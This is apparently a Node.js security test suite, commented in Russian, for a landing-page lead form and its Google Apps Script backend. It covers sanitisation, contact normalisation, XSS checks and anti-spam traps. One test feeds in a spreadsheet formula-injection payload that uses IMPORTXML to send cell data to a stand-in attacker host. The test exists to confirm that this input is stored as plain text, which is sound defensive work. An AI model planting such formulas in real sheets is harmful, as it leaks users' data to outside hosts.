/**
 * Тесты безопасности для лендинга + Apps Script сборщика заявок.
 * Запуск (нужен только Node.js, без npm):
 *   node tests/security.test.js
 *
 * Что проверяется:
 *  1. Чистка и валидация сервера (Code.gs) — инъекции, мусор, лимиты длин.
 *  2. Нормализация контактов (сервер и клиент) — подмена каналов/ссылок.
 *  3. Защита от формула-инъекции — статический анализ Code.gs.
 *  4. Отсутствие XSS-векторов и внешних ресурсов в index.html.
 *  5. Спутные провода отправки формы.
 */

'use strict';

const fs = require('fs');
const path = require('path');
const assert = require('assert');

const ROOT = path.join(__dirname, '..');
const CODE_GS = fs.readFileSync(path.join(ROOT, 'apps-script', 'Code.gs'), 'utf8');
const INDEX  = fs.readFileSync(path.join(ROOT, 'index.html'), 'utf8');

/* ---- загрузка чистых функций Code.gs в изолированный контекст ---- */
/* Заглушки Apps Script API — только для функций, не трогающих реальные сервисы */
const stubs = {
  ContentService: {
    MimeType: { JSON: 'application/json' },
    createTextOutput(s) { return { __s: s, setMimeType() { return this; }, getContent() { return this.__s; } }; }
  },
  Logger: { log() {} },
  LockService: { getScriptLock() { return { waitLock() {}, releaseLock() {} }; } },
  SpreadsheetApp: {
    getActiveSpreadsheet() {
      return { getSheetByName() { return null; }, insertSheet() { return null; } };
    }
  }
};
const codeRun = new Function(
  'ContentService', 'Logger', 'LockService', 'SpreadsheetApp',
  CODE_GS +
  '\n;return { cleanStr, cleanPhone, fmtPhone, normalizeContactSrv, isDuplicate, doGet, doPost, txtOut, getSheet, VERSION, SHEET_NAME };'
);
const srv = codeRun(stubs.ContentService, stubs.Logger, stubs.LockService, stubs.SpreadsheetApp);

/* ---- извлечение клиентской normalizeContact из index.html ---- */
const nm = INDEX.match(/function normalizeContact\(([\s\S]*?)\n}/);
assert(nm, 'normalizeContact не найден в index.html');
const cliNormalize = new Function('return function normalizeContact(' + nm[1] + '\n}')();

let passed = 0;
function t(name, fn) {
  fn();
  passed++;
  console.log('  OK  ' + name);
}
function group(name) { console.log('\n' + name); }

/* ================= 1. СЕРВЕР: чистка и валидация ================= */
group('1. Code.gs: очистка и валидация');

t('cleanStr: control-символы и переводы строк → пробел', () => {
  assert.strictEqual(srv.cleanStr('a\u0000b\u0001c', 50), 'a b c');
  assert.strictEqual(srv.cleanStr('line1\nline2\ttab', 50), 'line1 line2 tab');
});
t('cleanStr: схлопывает пробелы и обрезает хвост', () => {
  assert.strictEqual(srv.cleanStr('  много   пробелов  ', 50), 'много пробелов');
});
t('cleanStr: нечисловые/пустые значения → ""', () => {
  assert.strictEqual(srv.cleanStr(null, 50), '');
  assert.strictEqual(srv.cleanStr(undefined, 50), '');
  assert.strictEqual(srv.cleanStr(12, 50), '');
  assert.strictEqual(srv.cleanStr('', 50), '');
});
t('cleanStr: жёсткий лимит длины (обрезается)', () => {
  assert.strictEqual(srv.cleanStr('x'.repeat(200), 60).length, 60);
});
t('cleanStr: «формула» не исполняется — остаётся обычной строкой', () => {
  assert.strictEqual(srv.cleanStr('=IMPORTXML("http://evil.example/leak?"&A1)', 120), '=IMPORTXML("http://evil.example/leak?"&A1)');
  assert.strictEqual(srv.cleanStr('+7 (999) 123-45-67', 120), '+7 (999) 123-45-67');
});

t('cleanPhone: из форматированного номера извлекаются 11 цифр', () => {
  assert.strictEqual(srv.cleanPhone('+7 (926) 123-45-67'), '79261234567');
});
t('cleanPhone: «8» в начале → «7»', () => {
  assert.strictEqual(srv.cleanPhone('89991234567'), '79991234567');
});
t('cleanPhone: мусор игнорируется, цифры собираются', () => {
  assert.strictEqual(srv.cleanPhone('abc7926def123456'), '7926123456');
});
t('cleanPhone: не строка → ""', () => {
  assert.strictEqual(srv.cleanPhone(null), '');
  assert.strictEqual(srv.cleanPhone(42), '');
});

t('fmtPhone: 11 цифр → +7 (…) …-…-…', () => {
  assert.strictEqual(srv.fmtPhone('79261234567'), '+7 (926) 123-45-67');
});
t('fmtPhone: не 11 цифр — остаются как есть (не портим частичный номер)', () => {
  assert.strictEqual(srv.fmtPhone('123'), '123');
});

/* ================= 2. КОНТАКТЫ: нормализация каналов ================= */
group('2. Нормализация контактов (сервер / клиент)');

t('Telegram: t.me/ivanov → @ivanov', () => {
  assert.strictEqual(srv.normalizeContactSrv('Telegram', 'https://t.me/ivanov'), '@ivanov');
});
t('Telegram: @ivanov и «ivanov» → @ivanov', () => {
  assert.strictEqual(srv.normalizeContactSrv('Telegram', '@ivanov'), '@ivanov');
  assert.strictEqual(srv.normalizeContactSrv('Telegram', 'ivanov'), '@ivanov');
});
t('Telegram: мусор и битые ники отклоняются', () => {
  assert.strictEqual(srv.normalizeContactSrv('Telegram', 'i va!!n'), '');
  assert.strictEqual(srv.normalizeContactSrv('Telegram', 'гонка'), '');
});
t('Telegram: срезается query/hash («ivanov?ref=…», слишком короткий — нет) ', () => {
  assert.strictEqual(srv.normalizeContactSrv('Telegram', 'ivanov?utm=x'), '@ivanov');
  assert.strictEqual(srv.normalizeContactSrv('Telegram', 'ivan'), '');
});
t('ВКонтакте: vk.com/durov → durov, id-форма сохраняется', () => {
  assert.strictEqual(srv.normalizeContactSrv('ВКонтакте', 'https://vk.com/durov'), 'durov');
  assert.strictEqual(srv.normalizeContactSrv('ВКонтакте', 'id123'), 'id123');
});
t('MAX: точка/дефис допустимы, длинное имя допустимо', () => {
  assert.strictEqual(srv.normalizeContactSrv('MAX', 'user.name-1'), '@user.name-1');
});
t('E-mail: приводится к нижнему регистру и валидируется', () => {
  assert.strictEqual(srv.normalizeContactSrv('E-mail', ' Foo@BAR.com '), 'foo@bar.com');
  assert.strictEqual(srv.normalizeContactSrv('E-mail', 'not-an-email'), '');
});
t('Перезвонить/WhatsApp/неизвестный канал — контакт не трогаем (берётся телефон)', () => {
  assert.strictEqual(srv.normalizeContactSrv('Перезвонить', 'anything'), '');
  assert.strictEqual(srv.normalizeContactSrv('WhatsApp', 'anything'), '');
  assert.strictEqual(srv.normalizeContactSrv('ФАКС', '=HYPERLINK("x")'), '');
});

/* нормализация на клиенте (index.html) */
t('клиент: telegram/max с «@» и ссылкой', () => {
  assert.strictEqual(cliNormalize('telegram', 't.me/ivan'), '@ivan');
  assert.strictEqual(cliNormalize('telegram', '@IVA_n'), '@IVA_n');
  assert.strictEqual(cliNormalize('max', 'user.name-1'), '@user.name-1');
});
t('клиент: vk c полной ссылкой → чистый ник', () => {
  assert.strictEqual(cliNormalize('vk', 'https://vk.com/club123'), 'club123');
});
t('клиент: email — нижний регистр', () => {
  assert.strictEqual(cliNormalize('email', ' User@Mail.RU '), 'user@mail.ru');
});

/* ================= 3. ФОРМУЛА-ИНЪЕКЦИЯ (статический анализ) ================= */
group('3. Формула-инъекция в таблицу');

t('Code.gs: строки пишутся текстом (setNumberFormat("@") + setValues)', () => {
  assert(CODE_GS.includes("setNumberFormat('@')"), 'нет setNumberFormat("@")');
  assert(CODE_GS.includes('.setValues('), 'нет setValues');
});
t('Code.gs: не используется setFormula / setValue (запись только значением)', () => {
  assert(!CODE_GS.includes('.setFormula('), 'найден setFormula');
  assert(!CODE_GS.includes('.setValue('), 'найден setValue');
  /* setValues — допустимо; setValue/setFormula(type) — проверяем что отсутствуют */
  assert(!/\.setValue\(\s*['"](?:=|1\+1)/.test(CODE_GS));
});
t('Code.gs: appendRow (заголовки) не участвует в записи произвольных данных', () => {
  const uses = (CODE_GS.match(/appendRow\(/g) || []).length;
  assert(uses <= 1, 'appendRow найден >1 раза (лишняя точка ввода данных)');
});
t('GET наружу не отдаёт данные таблицы', () => {
  const r = srv.doGet().getContent();
  const j = JSON.parse(r);
  assert.strictEqual(j.ok, false);
  assert(/POST/i.test(j.error));
});

/* ================= 4. КЛИЕНТ: XSS и внешние ресурсы ================= */
group('4. index.html: XSS-векторы и внешние ресурсы');

t('Нет innerHTML/outerHTML/document.write/eval (вывод только через textContent)', () => {
  assert(!/innerHTML|outerHTML|document\.write|\.eval\(|new Function/.test(INDEX),
    'запрещённые методы найдены');
});
t('Все пользовательские значения попадают в DOM через textContent', () => {
  /* progName, successText, статус — только textContent */
  assert(/progName\.textContent =/.test(INDEX));
  assert(/successText\.textContent =/.test(INDEX));
});
t('Нет внешних скриптов/шрифтов/CDN (только локальные)', () => {
  const external = (INDEX.match(/https?:\/\//g) || []).filter(u => u.includes('script.google.com'));
  const fontsLocal = (INDEX.match(/url\('fonts\//g) || []).length >= 6;
  assert(fontsLocal, 'локальные woff2 не описаны');
  assert.strictEqual(external.length, 0, 'внешний endpoint обнаружен: ' + external.join(', '));
});
t('SHEETS_URL в демо выложке — заглушка (непубличный рабочий endpoint)', () => {
  assert(INDEX.includes("const SHEETS_URL = '';"), 'реальная строка SHEETS_URL должна быть пустой');
  const live = (INDEX.match(/script\.google\.com\/macros\/s\/[A-Za-z0-9_-]{20,}/g) || []);
  assert.strictEqual(live.length, 0, 'в коде остался живой endpoint: ' + live.join(', '));
});

/* ================= 5. АНТИСПАМ-ЛОВУШКИ (наличие в коде) ================= */
group('5. Антиспам-механики формы');

t('Есть honeypot-поле (fSite) с вызовом сервера-заглушки', () => {
  assert(/fSite\.value\.trim\(\)/.test(INDEX));
  assert(/name="website"/.test(INDEX));
});
t('Есть time-ловушка (отправка быстрее 3 секунд отклоняется)', () => {
  assert(/Date\.now\(\) - \(\+fTs\.value \|\| 0\) < 3000/.test(INDEX));
});
t('Есть троттлинг (не чаще 1 раза в 60 секунд на сессию)', () => {
  assert(/sessionStorage.*vv_last/.test(INDEX));
  assert(/< 60000/.test(INDEX));
});
t('Клиент требует согласие и валидирует телефон по маске', () => {
  assert(INDEX.includes("\\d{3}-\\d{2}-\\d{2}$"), 'регэксп маски телефона не найден');
  assert(INDEX.includes('consent.checked'), 'проверка согласия не найдена');
});

/* ================= ИТОГ ================= */
console.log('\nВсего тестов: ' + passed + ', ошибок: 0');